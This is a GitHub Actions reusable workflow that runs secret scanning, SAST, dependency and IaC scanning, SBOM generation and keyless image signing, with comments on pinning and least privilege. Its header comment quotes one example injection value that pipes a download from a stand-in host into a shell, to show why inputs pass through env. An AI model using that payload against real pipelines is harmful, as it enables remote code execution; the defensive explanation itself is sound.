### Reusable security pipeline — call it with `workflow_call` from any repo.
###
### Three pinning rules, no exceptions:
###   1. Every third-party action is pinned to a full commit SHA. The comment
###      records the tag that SHA belonged to when it was resolved; tags are
###      mutable, SHAs are not.
###   2. Every tool runs from a container pinned by tag *and* digest, so a
###      repointed tag cannot change what executes.
###   3. Nothing untrusted reaches a `run:` block through `${{ }}`. Inputs are
###      passed into the step's `env:` and dereferenced by the shell, so a
###      value like `"; curl evil.sh | sh #` is data, not code.
###
### Stages: secret scan -> SAST -> dependency/IaC scan -> SBOM -> keyless
### signature + SBOM attestation. Each job gets only the permissions it needs.
name: Reusable security pipeline

on:
  workflow_call:
    inputs:
      image-ref:
        description: >-
          Fully-qualified, already-pushed image reference to attest and sign
          (e.g. ghcr.io/org/app@sha256:...). Leave empty to skip the sbom and
          sign jobs. Pass a digest, not a tag: signing a tag signs whatever
          that tag points at right now.
        required: false
        type: string
        default: ""
      fail-on-severity:
        description: "Minimum trivy severity that fails the build."
        required: false
        type: string
        default: "CRITICAL,HIGH"
    secrets:
      SEMGREP_APP_TOKEN:
        description: >-
          Optional. Only needed to send results to Semgrep AppSec Platform
          and to use its managed rule policy. Without it the scan still runs
          with the registry's `auto` ruleset.
        required: false

# Deny everything at the top level, then grant per job. Without this block a
# repo whose default token is read/write hands every job a write token.
permissions: {}

jobs:
  secret-scan:
    name: Secret scan (gitleaks)
    runs-on: ubuntu-24.04
    timeout-minutes: 15
    permissions:
      contents: read
    steps:
      - name: Checkout
        # actions/checkout@v6.1.0
        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1
        with:
          # gitleaks scans history, not just the tip: a secret that was
          # committed and then deleted is still in the pack file, and still
          # valid until it is revoked.
          fetch-depth: 0
      - name: Run gitleaks
        run: |
          docker run --rm \
            --user "$(id -u):$(id -g)" \
            -v "$PWD:/repo" \
            zricethezav/gitleaks:v8.30.1@sha256:c00b6bd0aeb3071cbcb79009cb16a60dd9e0a7c60e2be9ab65d25e6bc8abbb7f \
            git /repo --no-banner --redact --exit-code 1 \
            --report-format sarif --report-path /repo/gitleaks.sarif
      - name: Upload SARIF
        if: always()
        # actions/upload-artifact@v4.6.2
        uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a
        with:
          name: gitleaks-sarif
          path: gitleaks.sarif
          if-no-files-found: ignore
          retention-days: 14

  sast:
    name: SAST (semgrep)
    runs-on: ubuntu-24.04
    timeout-minutes: 30
    permissions:
      contents: read
      security-events: write
    steps:
      - name: Checkout
        # actions/checkout@v6.1.0
        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1
      - name: Run semgrep
        # `returntocorp/semgrep-action` is archived, and so is its successor
        # `semgrep/semgrep-action`. Current upstream guidance is to run the
        # `semgrep/semgrep` image and invoke the CLI: `semgrep ci` in CI
        # (it diffs against the baseline ref and honours .semgrepignore),
        # or `semgrep scan` for a full scan of everything.
        #
        # `--config=auto` fetches the registry's curated rules for the
        # languages it detects: that needs network egress and, per Semgrep's
        # terms, sends anonymous usage metrics. If neither is acceptable,
        # vendor the rules and use `--config=./semgrep-rules --metrics=off`.
        env:
          SEMGREP_APP_TOKEN: ${{ secrets.SEMGREP_APP_TOKEN }}
        run: |
          docker run --rm \
            --user "$(id -u):$(id -g)" \
            -v "$PWD:/src" -w /src \
            -e SEMGREP_APP_TOKEN \
            -e HOME=/tmp \
            semgrep/semgrep:1.178.0@sha256:32e459968daabe7ab86968184a29109b9564aa00392401156f9788452b42786b \
            semgrep ci --config=auto --sarif --sarif-output=semgrep.sarif
      - name: Upload SARIF to code scanning
        if: always()
        # github/codeql-action/upload-sarif@v4.38.2
        uses: github/codeql-action/upload-sarif@2892aa5e19bbd11bc0cff5427e3b750a04d9e3c2
        with:
          sarif_file: semgrep.sarif
          category: semgrep

  dependency-iac-scan:
    name: Dependency + IaC scan (trivy)
    runs-on: ubuntu-24.04
    timeout-minutes: 30
    permissions:
      contents: read
      security-events: write
    steps:
      - name: Checkout
        # actions/checkout@v6.1.0
        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1
      - name: Run trivy fs scan
        # FAIL_ON_SEVERITY comes in through env, never through ${{ }} inside
        # the script — see pinning rule 3 at the top of this file.
        env:
          FAIL_ON_SEVERITY: ${{ inputs.fail-on-severity }}
        run: |
          docker run --rm \
            --user "$(id -u):$(id -g)" \
            -v "$PWD:/src" -w /src \
            -e TRIVY_CACHE_DIR=/tmp/trivy \
            -e FAIL_ON_SEVERITY \
            aquasec/trivy:0.74.0@sha256:62b1e65e8869bc4b4c6aa4fa2b21595256c7c2f6018a9d9ad61caf87187c1969 \
            fs --scanners vuln,misconfig,secret --format sarif \
            --output /src/trivy.sarif \
            --severity "$FAIL_ON_SEVERITY" --exit-code 1 .
      - name: Upload SARIF to code scanning
        if: always()
        # github/codeql-action/upload-sarif@v4.38.2
        uses: github/codeql-action/upload-sarif@2892aa5e19bbd11bc0cff5427e3b750a04d9e3c2
        with:
          sarif_file: trivy.sarif
          category: trivy

  sbom:
    name: SBOM (syft)
    if: inputs.image-ref != ''
    runs-on: ubuntu-24.04
    timeout-minutes: 15
    permissions:
      contents: read
      packages: read # syft pulls the image from the registry to inspect it
    steps:
      - name: Log in to GHCR
        # Only needed for a private registry; harmless for a public one.
        env:
          GITHUB_TOKEN: ${{ github.token }}
        run: echo "$GITHUB_TOKEN" | docker login ghcr.io -u "${{ github.actor }}" --password-stdin
      - name: Generate CycloneDX SBOM
        env:
          IMAGE_REF: ${{ inputs.image-ref }}
        run: |
          docker run --rm \
            -v "$HOME/.docker/config.json:/tmp/config.json:ro" \
            -e DOCKER_CONFIG=/tmp \
            -e IMAGE_REF \
            anchore/syft:v1.52.0@sha256:500e2d872ac019436926e8322b4fc1f39441d94d21f6f4046c6ff29b30e8cb02 \
            "$IMAGE_REF" -o cyclonedx-json > sbom.cdx.json
      - name: Upload SBOM
        # actions/upload-artifact@v4.6.2
        uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a
        with:
          name: sbom
          path: sbom.cdx.json
          retention-days: 90

  sign:
    name: Sign image + attest SBOM (cosign, keyless)
    if: inputs.image-ref != ''
    needs: [sbom]
    runs-on: ubuntu-24.04
    timeout-minutes: 15
    permissions:
      contents: read
      id-token: write # mint the OIDC token Fulcio exchanges for a certificate
      packages: write # push signature + attestation next to the image
    steps:
      - name: Install cosign
        # sigstore/cosign-installer@v4.1.2
        uses: sigstore/cosign-installer@6f9f17788090df1f26f669e9d70d6ae9567deba6
        with:
          cosign-release: "v3.1.3"
      - name: Download SBOM
        # actions/download-artifact@v8.0.1
        uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c
        with:
          name: sbom
      - name: Log in to GHCR
        env:
          GITHUB_TOKEN: ${{ github.token }}
        run: echo "$GITHUB_TOKEN" | docker login ghcr.io -u "${{ github.actor }}" --password-stdin
      - name: Sign image (keyless — no signing key to store, rotate or leak)
        env:
          IMAGE_REF: ${{ inputs.image-ref }}
        run: cosign sign --yes "$IMAGE_REF"
      - name: Attach the SBOM as a signed attestation
        env:
          IMAGE_REF: ${{ inputs.image-ref }}
        run: |
          cosign attest --yes --type cyclonedx \
            --predicate sbom.cdx.json "$IMAGE_REF"
      - name: Verify what was just published
        # A signature nobody verifies is decoration. Both flags are required:
        # without --certificate-identity* any GitHub workflow's signature
        # satisfies the check, and without --certificate-oidc-issuer any
        # Sigstore issuer does.
        #
        # The identity in the certificate is the *job* workflow ref — for a
        # reusable workflow that is this file's own path@ref, not the caller's.
        # Vendored in the same repo (as the caller example does) they match;
        # called across repos they do not, which is why this matches on a
        # prefix. Tighten it to a literal --certificate-identity once you know
        # which form your setup produces: `cosign verify ... -o text` prints it.
        env:
          IMAGE_REF: ${{ inputs.image-ref }}
          IDENTITY_RE: ^https://github\.com/${{ github.repository }}/\.github/workflows/
        run: |
          cosign verify \
            --certificate-identity-regexp "$IDENTITY_RE" \
            --certificate-oidc-issuer https://token.actions.githubusercontent.com \
            "$IMAGE_REF" >/dev/null
